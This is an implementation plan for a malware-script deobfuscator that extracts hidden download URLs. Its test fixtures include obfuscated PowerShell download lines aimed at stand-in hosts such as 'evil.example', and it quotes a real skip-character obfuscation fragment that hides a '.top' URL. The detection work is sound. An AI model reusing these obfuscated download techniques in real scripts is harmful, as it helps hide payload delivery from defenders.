# batdeob Plan N — 4 patterns from residual no-IOC investigation

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development.

**Goal:** Add 4 new URL-extraction patterns identified in the Plan M investigation of ~672 no-IOC corpus samples. Expected combined impact: **+23 samples (52.4% → 54.1%)**.

**Prereq:** Plans A-M landed. 244 tests, v12 corpus 742/1415 (52.4%) URL coverage, 4.5 MB binary.

---

## Task 1: Pattern A — generalize b64-URL sweep (highest impact, +14 samples)

**Current**: Plan L Task 2 added `scan_inline_b64_urls` that only matches `FromBase64String('<b64>')`. The investigation found 14 more samples where the same b64-URL pattern occurs in a bare `$var = 'aHR0cHM6...'` literal that isn't wrapped in `FromBase64String`. The URL only surfaces if the script later does `[UTF8.GetString(FromBase64String($var))]` — which our pipeline doesn't follow when it's a variable indirection.

**Fix**: extend the sweep to also match standalone single-quoted strings ≥60 chars, attempt base64 decode, check if result is a URL.

**Files:**
- Modify: `rust/crates/batdeob-core/src/deob_scan.rs`

- [ ] **Step 1: Add test** to `lib.rs`:

```rust
#[cfg(test)]
mod b64_url_anywhere_tests {
    use crate::{analyze, Config};
    use crate::traits::Trait;
    use base64::Engine;

    #[test]
    fn bare_quoted_b64_url_extracted() {
        // The b64 string appears as a bare $var = 'aHR0...' literal
        // (not wrapped in FromBase64String). The decoded result is a URL.
        let url = "https://github.com/CryptersAndTools/Upload/blob/main/new_image.jpg";
        let b64 = base64::engine::general_purpose::STANDARD.encode(url.as_bytes());
        let script = format!("set X=$base64Url = '{}'\r\necho %X%\r\n", b64);
        let report = analyze(script.as_bytes(), &Config::default());
        let has = report.traits.iter().any(|t| matches!(t,
            Trait::DownloadInDeobText { src, .. } if src.contains("CryptersAndTools")
        ));
        assert!(has, "no bare-b64 URL: {:?}", report.traits);
    }

    #[test]
    fn double_quoted_b64_url_extracted() {
        // Some scripts use double quotes
        let url = "https://example.com/payload.exe";
        let b64 = base64::engine::general_purpose::STANDARD.encode(url.as_bytes());
        let script = format!("set X=$url = \"{}\"\r\necho %X%\r\n", b64);
        let report = analyze(script.as_bytes(), &Config::default());
        let has = report.traits.iter().any(|t| matches!(t,
            Trait::DownloadInDeobText { src, .. } if src.contains("example.com/payload.exe")
        ));
        assert!(has, "no double-quoted b64 URL: {:?}", report.traits);
    }
}
```

- [ ] **Step 2: Add the broader sweep** to `deob_scan.rs`

Add a new sweep function (separate from `scan_inline_b64_urls` so we don't change Plan L behavior):

```rust
#[allow(clippy::expect_used)]
static QUOTED_B64_RE: Lazy<Regex> = Lazy::new(|| {
    // Single OR double quoted base64 string ≥60 chars
    Regex::new(r#"['"]([A-Za-z0-9+/]{60,1500}={0,2})['"]"#).expect("quoted b64")
});

pub fn scan_bare_b64_urls(deobfuscated: &str, env: &mut Environment) {
    use base64::Engine;
    let known: std::collections::HashSet<String> = env.traits.iter()
        .filter_map(|t| match t {
            Trait::Download { src, .. } => Some(src.clone()),
            Trait::CertutilDownload { url, .. } => Some(url.clone()),
            Trait::BitsadminDownload { url, .. } => Some(url.clone()),
            Trait::DownloadInDeobText { src, .. } => Some(src.clone()),
            _ => None,
        })
        .collect();
    let mut seen: std::collections::HashSet<String> = std::collections::HashSet::new();
    for caps in QUOTED_B64_RE.captures_iter(deobfuscated) {
        let Some(b64_m) = caps.get(1) else { continue };
        let b64 = b64_m.as_str();
        let Ok(decoded) = base64::engine::general_purpose::STANDARD.decode(b64) else { continue };
        // Try UTF-8 first
        let text = match String::from_utf8(decoded.clone()) {
            Ok(s) => s,
            Err(_) => {
                // Fallback: pure ASCII bytes-as-chars
                let s: String = decoded.iter().filter(|b| b.is_ascii()).map(|b| *b as char).collect();
                if s.len() < decoded.len() { continue; }  // had non-ASCII
                s
            }
        };
        let text = text.trim();
        // The decoded text must START with http(s)/ftp — not just CONTAIN it
        // (since longer payloads with embedded URLs are caught by other passes)
        if !(text.starts_with("http://") || text.starts_with("https://") || text.starts_with("ftp://")) {
            continue;
        }
        if text.len() > 2048 { continue; }
        if !text.chars().all(|c| !c.is_control()) { continue; }
        let url = text.to_string();
        if known.contains(&url) { continue; }
        if !seen.insert(url.clone()) { continue; }
        env.traits.push(Trait::DownloadInDeobText {
            src: url,
            line_hint: "quoted-b64-string".to_string(),
        });
    }
}
```

Wire from `analyze()` in `lib.rs` AFTER `scan_inline_b64_urls`:

```rust
    deob_scan::scan_inline_b64_urls(&out, &mut env);
    deob_scan::scan_bare_b64_urls(&out, &mut env);   // NEW
    deob_scan::scan_unc_webdav(&out, &mut env);
```

- [ ] **Step 3: Verify + commit**

```bash
export PATH="$HOME/.cargo/bin:$PATH"
cd /home/coz/Downloads/batch_deobfuscator/rust && cargo test --workspace 2>&1 | tail -10
cd /home/coz/Downloads/batch_deobfuscator/rust && cargo clippy --workspace --all-targets -- -D warnings 2>&1 | tail -5
cd /home/coz/Downloads/batch_deobfuscator
git add rust/crates/batdeob-core/src/
git commit -m "deob_scan: sweep any quoted b64 string (60+ chars) that decodes to a URL"
```

---

## Task 2: Pattern B — Invoke-Obfuscation skip-nth-char decoder (+5 samples)

**Pattern**:

```powershell
(ni -p function: -n Omnipotence -value {
    param($x); $i=1; do { $out+=$x[$i]; $i+=2 } until(!$x[$i]); $out
})
$url = Omnipotence ' hDtrtRp sr: /s/ a fSlKavc,lMt d .UtCo.pJ/ P'
# → 'https://aflacltd.top/Paahngeren.csv'
```

A PS function is defined that extracts every Nth character starting at some index. Step sizes observed in corpus: 2, 3, 4.

**Files:**
- Modify: `rust/crates/batdeob-core/src/ps1_scan.rs`

- [ ] **Step 1: Add test**

```rust
#[cfg(test)]
mod skip_nth_decoder_tests {
    use crate::{analyze, Config};
    use crate::traits::Trait;
    use base64::Engine;

    fn encode_utf16(payload: &str) -> String {
        let utf16: Vec<u8> = payload.encode_utf16().flat_map(|u| u.to_le_bytes()).collect();
        base64::engine::general_purpose::STANDARD.encode(&utf16)
    }

    #[test]
    fn skip_2_decoder_recovers_url() {
        // The carrier string is constructed so that picking every other char starting
        // at index 1 spells the URL. Padding chars at even indices are random.
        // Target URL: "http://x.com/y" (14 chars)
        // Carrier: "?h?t?t?p?:?/?/?x?.?c?o?m?/?y" (29 chars, '?' at even indices)
        let inner = r#"function dec($x){$i=1;$out='';do{$out+=$x[$i];$i+=2}until(!$x[$i]);$out};
$url = dec '?h?t?t?p?:?/?/?x?.?c?o?m?/?y';
Invoke-WebRequest -Uri $url"#;
        let script = format!("powershell -EncodedCommand {}\r\n", encode_utf16(inner));
        let report = analyze(script.as_bytes(), &Config::default());
        let has = report.traits.iter().any(|t| matches!(t,
            Trait::Download { src, .. } if src.contains("x.com/y")
        ));
        assert!(has, "skip-2 decoder didn't recover URL: {:?}", report.traits);
    }
}
```

- [ ] **Step 2: Add the decoder** to `ps1_scan.rs`

The detection: regex for a `do { $acc += $str[$idx]; $idx += N } until` pattern, recover the function name and step N. Then for each call site `function_name 'carrier'`, decode the carrier with step N starting from some index (default 1; check the `$i=N` initializer).

Add this as a new expander, called BEFORE `expand_ps_variables`:

```rust
#[allow(clippy::expect_used)]
static SKIP_NTH_DEF_RE: Lazy<Regex> = Lazy::new(|| {
    // function NAME(<param>){ <init>; do{$<acc>+=$<param>[$<idx>]; $<idx>+=N }until ... }
    // OR: (ni -p function: -n NAME -value { ... })
    Regex::new(
        r#"(?is)(?:function\s+(\w+)\s*\([^)]*\)|-n\s+(\w+))[^{]*\{[^}]*?\$(\w+)\s*=\s*(\d+)[^}]*?do\s*\{\s*\$(\w+)\s*\+?=\s*\$(\w+)\[\s*\$\5\s*\]\s*;?\s*\$\5\s*\+=\s*(\d+)[^}]*?until"#
    ).expect("skip-nth def")
});

fn expand_skip_nth(text: &str) -> String {
    let mut out = text.to_string();
    let captures: Vec<_> = SKIP_NTH_DEF_RE.captures_iter(text).collect();
    for caps in captures {
        let fn_name = caps.get(1).or_else(|| caps.get(2)).map(|m| m.as_str().to_string());
        let start: usize = caps.get(4).and_then(|m| m.as_str().parse().ok()).unwrap_or(1);
        let step: usize = caps.get(7).and_then(|m| m.as_str().parse().ok()).unwrap_or(2);
        let Some(name) = fn_name else { continue };
        if step == 0 || step > 10 { continue; }
        if start > 10 { continue; }
        // Find call sites: NAME 'carrier' or NAME "carrier"
        let call_re_str = format!(r#"{}\s+['"]([^'"]{{6,2048}})['"]"#, regex::escape(&name));
        let Ok(call_re) = regex::Regex::new(&call_re_str) else { continue };
        let call_matches: Vec<_> = call_re.captures_iter(text).collect();
        for cc in call_matches {
            let Some(full) = cc.get(0) else { continue };
            let Some(carrier_m) = cc.get(1) else { continue };
            let carrier = carrier_m.as_str();
            let chars: Vec<char> = carrier.chars().collect();
            let mut decoded = String::new();
            let mut i = start;
            while i < chars.len() {
                decoded.push(chars[i]);
                i = i.checked_add(step).unwrap_or(chars.len());
            }
            // Replace the call site with the decoded string in quotes
            let replacement = format!("'{}'", decoded.replace('\'', ""));
            out = out.replace(full.as_str(), &replacement);
        }
    }
    out
}
```

Wire into `expand_obfuscation` early (before `expand_ps_variables`):

```rust
fn expand_obfuscation(text: &str) -> String {
    let mut out = text.to_string();
    out = expand_skip_nth(&out);    // NEW — runs first
    out = expand_char_concat(&out);
    out = expand_string_concat(&out);
    // ... existing ...
    out
}
```

- [ ] **Step 3: Verify + commit**

```bash
export PATH="$HOME/.cargo/bin:$PATH"
cd /home/coz/Downloads/batch_deobfuscator/rust && cargo test --workspace 2>&1 | tail -10
cd /home/coz/Downloads/batch_deobfuscator
git add rust/crates/batdeob-core/src/
git commit -m "ps1_scan: detect+decode Invoke-Obfuscation skip-nth-char functions"
```

---

## Task 3: Patterns C+D — space-concat URL + multi-chunk char-array (+4 samples)

**Pattern C**: `$x='https' '://example.com/y'` — PS array of two string literals, joined by `-join ''` later.

**Pattern D**: `([char[]]@(104,116)-join '') + ([char[]]@(116,112,58,47)-join '')` — multiple `[char[]]@(...)` chunks concatenated with `+`.

**Files:**
- Modify: `rust/crates/batdeob-core/src/ps1_scan.rs`

- [ ] **Step 1: Add tests**

```rust
#[cfg(test)]
mod assembly_pattern_tests {
    use crate::{analyze, Config};
    use crate::traits::Trait;
    use base64::Engine;

    fn encode_utf16(payload: &str) -> String {
        let utf16: Vec<u8> = payload.encode_utf16().flat_map(|u| u.to_le_bytes()).collect();
        base64::engine::general_purpose::STANDARD.encode(&utf16)
    }

    #[test]
    fn space_concat_url_array_resolves() {
        let inner = r#"$bnt='https' '://evil.example/y'; Invoke-WebRequest ($bnt -join '')"#;
        let script = format!("powershell -EncodedCommand {}\r\n", encode_utf16(inner));
        let report = analyze(script.as_bytes(), &Config::default());
        let has = report.traits.iter().any(|t| matches!(t,
            Trait::Download { src, .. } if src.contains("evil.example/y")
        ));
        assert!(has, "space-concat not resolved: {:?}", report.traits);
    }

    #[test]
    fn multi_chunk_char_array_concat_resolves() {
        // ([char[]]@(104,116,116,112)-join '') + ([char[]]@(58,47,47,120)-join '') + ([char[]]@(46,99,111,109)-join '')
        // → 'http' + '://x' + '.com' = 'http://x.com'
        let inner = r#"$u = ([char[]]@(104,116,116,112)-join '') + ([char[]]@(58,47,47,120)-join '') + ([char[]]@(46,99,111,109)-join ''); Invoke-WebRequest -Uri $u"#;
        let script = format!("powershell -EncodedCommand {}\r\n", encode_utf16(inner));
        let report = analyze(script.as_bytes(), &Config::default());
        let has = report.traits.iter().any(|t| matches!(t,
            Trait::Download { src, .. } if src.contains("http://x.com")
        ));
        assert!(has, "multi-chunk char-array not resolved: {:?}", report.traits);
    }
}
```

- [ ] **Step 2: Add Pattern C expander**

```rust
#[allow(clippy::expect_used)]
static SPACE_CONCAT_RE: Lazy<Regex> = Lazy::new(|| {
    // 'a' 'b' 'c' ...  (2+ adjacent quoted strings separated by whitespace, no operator)
    Regex::new(r#"((?:'[^']*'\s+){1,}'[^']*')"#).expect("space concat")
});

fn expand_space_concat(text: &str) -> String {
    let mut out = text.to_string();
    let matches: Vec<(usize, usize, String)> = SPACE_CONCAT_RE.captures_iter(text)
        .filter_map(|caps| {
            let full = caps.get(0)?;
            let inner = caps.get(1)?.as_str();
            // Extract all single-quoted parts
            let parts_re = regex::Regex::new(r"'([^']*)'").ok()?;
            let parts: Vec<String> = parts_re.captures_iter(inner)
                .filter_map(|c| c.get(1).map(|m| m.as_str().to_string()))
                .collect();
            if parts.len() < 2 { return None; }
            let combined = parts.join("");
            Some((full.start(), full.end(), format!("'{}'", combined)))
        })
        .collect();
    for (start, end, replacement) in matches.into_iter().rev() {
        out.replace_range(start..end, &replacement);
    }
    out
}
```

- [ ] **Step 3: Add Pattern D expander** — `([char[]]@(...))-join '' + ([char[]]@(...))-join ''` chains

```rust
#[allow(clippy::expect_used)]
static CHAR_ARRAY_CHUNK_RE: Lazy<Regex> = Lazy::new(|| {
    // ([char[]]@( N1,N2,N3 )-join '')
    Regex::new(r#"\(\[char\[\]\]\s*@\(\s*((?:\d+\s*,\s*)*\d+)\s*\)\s*-join\s*['"][^'"]*['"]\s*\)"#).expect("char arr chunk")
});

fn expand_char_array_chunks(text: &str) -> String {
    let mut out = text.to_string();
    // Match each chunk individually first
    let matches: Vec<(usize, usize, String)> = CHAR_ARRAY_CHUNK_RE.captures_iter(text)
        .filter_map(|caps| {
            let full = caps.get(0)?;
            let nums_str = caps.get(1)?.as_str();
            let nums: Vec<char> = nums_str.split(',')
                .filter_map(|s| s.trim().parse::<u32>().ok())
                .filter_map(char::from_u32)
                .collect();
            if nums.is_empty() { return None; }
            let s: String = nums.into_iter().collect();
            Some((full.start(), full.end(), format!("'{}'", s)))
        })
        .collect();
    for (start, end, replacement) in matches.into_iter().rev() {
        out.replace_range(start..end, &replacement);
    }
    // After each chunk becomes 'x', a chain like 'a' + 'b' + 'c' is now standard PS
    // concatenation — expand_string_concat (already in pipeline) handles that.
    out
}
```

Wire BOTH into `expand_obfuscation` (insert after `expand_char_concat`, before `expand_string_concat` — so chunks resolve to strings, then string concat joins them):

```rust
fn expand_obfuscation(text: &str) -> String {
    let mut out = text.to_string();
    out = expand_skip_nth(&out);
    out = expand_char_concat(&out);
    out = expand_char_array_chunks(&out);   // NEW
    out = expand_space_concat(&out);         // NEW
    out = expand_string_concat(&out);
    // ... existing ...
    out
}
```

- [ ] **Step 4: Verify + commit**

```bash
export PATH="$HOME/.cargo/bin:$PATH"
cd /home/coz/Downloads/batch_deobfuscator/rust && cargo test --workspace 2>&1 | tail -10
cd /home/coz/Downloads/batch_deobfuscator
git add rust/crates/batdeob-core/src/ps1_scan.rs rust/crates/batdeob-core/src/lib.rs
git commit -m "ps1_scan: expand space-concat string arrays + multi-chunk char arrays"
```

---

## Task 4: Corpus v13 + measurement

- [ ] **Step 1: Build + run**

```bash
export PATH="$HOME/.cargo/bin:$PATH"
cd /home/coz/Downloads/batch_deobfuscator/rust && cargo build --release 2>&1 | tail -3
sed 's|corpus_results_v12|corpus_results_v13|g' /tmp/corpus_run_v12.sh > /tmp/corpus_run_v13.sh
chmod +x /tmp/corpus_run_v13.sh
mkdir -p /tmp/corpus_results_v13 && rm -rf /tmp/corpus_results_v13/* 2>/dev/null
timeout 1800 /tmp/corpus_run_v13.sh > /tmp/corpus_run_v13.log 2>&1
ls /tmp/corpus_results_v13/*.json | wc -l
```

- [ ] **Step 2: Compare v12 → v13**

```bash
python3 <<'PY'
import json
from pathlib import Path
from collections import Counter

def stats(d):
    samples = {}
    for f in Path(d).glob("*.json"):
        if f.stat().st_size == 0: continue
        try: samples[f.stem] = json.load(open(f))
        except: pass
    return samples

v12 = stats("/tmp/corpus_results_v12")
v13 = stats("/tmp/corpus_results_v13")
common = set(v12) & set(v13)
print(f"v12={len(v12)}  v13={len(v13)}  common={len(common)}")

def counts(samples, keys):
    cnt = Counter()
    for k in keys:
        for t in samples[k].get("traits", []):
            cnt[t.get("kind","")] += 1
    return cnt

c12 = counts(v12, common)
c13 = counts(v13, common)
print(f"\nOn {len(common)} common samples:")
print(f"  {'Trait':32} {'v12':>8} {'v13':>8}  Δ")
for k in sorted(set(c12)|set(c13), key=lambda x: -max(c12[x], c13[x]))[:15]:
    delta = c13[k] - c12[k]
    sign = "+" if delta > 0 else ""
    print(f"    {k:30} {c12[k]:>8} {c13[k]:>8}  {sign}{delta}")

URL_KINDS = {"Download","DownloadInDeobText","CertutilDownload","BitsadminDownload","UncWebDavC2"}
v12_with = sum(1 for k in common if any(t.get("kind") in URL_KINDS for t in v12[k].get("traits",[])))
v13_with = sum(1 for k in common if any(t.get("kind") in URL_KINDS for t in v13[k].get("traits",[])))
gained = sum(1 for k in common if
    not any(t.get("kind") in URL_KINDS for t in v12[k].get("traits",[])) and
    any(t.get("kind") in URL_KINDS for t in v13[k].get("traits",[]))
)
lost = sum(1 for k in common if
    any(t.get("kind") in URL_KINDS for t in v12[k].get("traits",[])) and
    not any(t.get("kind") in URL_KINDS for t in v13[k].get("traits",[]))
)
print(f"\nSamples with URL IOC: v12={v12_with} ({100*v12_with/len(common):.1f}%) → v13={v13_with} ({100*v13_with/len(common):.1f}%)")
print(f"  Gained: +{gained}  Lost: -{lost}")
PY
```

- [ ] **Step 3: Commit completion marker**

```bash
cd /home/coz/Downloads/batch_deobfuscator
git commit --allow-empty -m "$(cat <<EOF
Plan N complete: v13 corpus — 4 residual patterns

[paste table + samples_gained / lost]
EOF
)"
```

## Report

- Test count target: 244 + ~5 new = 249
- v12 → v13 deltas
- Samples gained (target: ~20-23)
- 5 example URLs from new traits
- Any regressions
- Commit SHAs

---

## Self-review

- **Spec coverage**: 4 patterns from concrete investigation findings, each with sample-frequency estimate.
- **Placeholders**: none.
- **Risk**: `scan_bare_b64_urls` may produce false positives on legitimate b64 blobs that incidentally start with `http`. Mitigation: full URL validation (no control chars, length cap, must start with full scheme). Dedup against already-found URLs.

**Plan N complete.** Execute via `superpowers:subagent-driven-development`.
